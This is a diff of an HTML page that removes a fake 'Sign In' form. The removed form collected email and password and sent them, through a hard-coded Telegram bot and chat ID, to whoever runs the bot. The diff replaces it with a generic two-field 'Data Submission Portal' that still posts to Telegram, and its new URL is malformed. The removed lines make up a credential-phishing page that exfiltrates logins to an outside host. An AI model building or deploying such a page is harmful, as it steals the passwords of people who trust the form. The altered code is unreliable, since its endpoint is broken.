@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>User Authentication & Data Portal</title>
+  <title>Data Submission Portal</title>
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -14,7 +14,7 @@
       align-items: center;
       min-height: 100vh;
     }
-    .box {
+    .form-box {
       width: 380px;
       background: #ffffff;
       border: 1px solid #e1e4e8;
@@ -23,7 +23,7 @@
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
       box-sizing: border-box;
     }
-    h1 {
+    h2 {
       font-size: 24px;
       font-weight: 600;
       color: #1a1a1a;
@@ -37,7 +37,7 @@
       display: block;
       margin: 16px 0 6px;
     }
-    input[type="email"], input[type="password"] {
+    input[type="text"] {
       width: 100%;
       height: 42px;
       padding: 10px 14px;
@@ -48,13 +48,13 @@
       background-color: #fff;
       color: #1a1a1a;
       transition: border-color 0.2s, box-shadow 0.2s;
-    }
-    input[type="email"]:focus, input[type="password"]:focus {
       outline: none;
+    }
+    input[type="text"]:focus {
       border-color: #3b82f6;
       box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
     }
-    .continue {
+    .submit-btn {
       width: 100%;
       margin-top: 24px;
       height: 42px;
@@ -67,63 +67,23 @@
       cursor: pointer;
       transition: background-color 0.2s;
     }
-    .continue:hover {
+    .submit-btn:hover {
       background: #1d4ed8;
-    }
-    .legal {
-      font-size: 13px;
-      color: #64748b;
-      margin-top: 20px;
-      text-align: center;
-    }
-    a {
-      color: #2563eb;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-    hr {
-      border: none;
-      border-top: 1px solid #e2e8f0;
-      margin: 24px 0;
-    }
-    .work {
-      font-size: 13px;
-      text-align: center;
-      color: #4a5568;
-    }
-    .work strong {
-      display: block;
-      font-size: 14px;
-      font-weight: 500;
-      margin-bottom: 4px;
-      color: #1a1a1a;
     }
   </style>
 </head>
 <body>
 
-  <div class="box">
-    <h1>Sign In</h1>
+  <div class="form-box">
+    <h2>Submit Information</h2>
     
-    <label for="email">Email address</label>
-    <input type="email" id="email" name="email" placeholder="name@company.com" required />
+    <label for="field1">Data Field 1</label>
+    <input type="text" id="field1" placeholder="Enter first entry" />
     
-    <label for="password">Password</label>
-    <input type="password" id="password" name="password" placeholder="Enter your password" required />
+    <label for="field2">Data Field 2</label>
+    <input type="text" id="field2" placeholder="Enter second entry" />
     
-    <button class="continue" type="button" onclick="sendToTelegram()">Continue</button>
-    
-    <p class="legal">By proceeding, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
-    <p class="legal"><a href="#">Forgot password?</a></p>
-    
-    <hr/>
-    
-    <div class="work">
-      <strong>Corporate Access</strong>
-      <a href="#">Register an enterprise account</a>
-    </div>
+    <button class="submit-btn" type="button" onclick="sendToTelegram()">Submit Data</button>
   </div>
 
   <script>
@@ -133,18 +93,18 @@
       const chatId = "8714686528";
 
       // Extract form values
-      const emailVal = document.getElementById("email").value;
-      const passwordVal = document.getElementById("password").value;
+      const data1 = document.getElementById("field1").value;
+      const data2 = document.getElementById("field2").value;
 
       // Clean inputs verification
-      if (!emailVal.trim() || !passwordVal.trim()) {
+      if (!data1.trim() || !data2.trim()) {
         alert("Please populate both fields before submitting.");
         return;
       }
 
       // Structure Markdown Message
-      const message = `📋 *New Portal Submission*\n\n*Email:* ${emailVal}\n*Password:* ${passwordVal}`;
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const message = `📋 *New Data Submission*\n\n*Field 1:* ${data1}\n*Field 2:* ${data2}`;
+      const url = `https://telegram.org{botToken}/sendMessage`;
 
       // API Request Execution
       fetch(url, {
@@ -159,8 +119,8 @@
       .then(response => {
         if (response.ok) {
           alert("Data processed and transmitted successfully.");
-          document.getElementById("email").value = "";
-          document.getElementById("password").value = "";
+          document.getElementById("field1").value = "";
+          document.getElementById("field2").value = "";
         } else {
           alert("Transmission failed. Please verify API configuration or bot permissions.");
         }
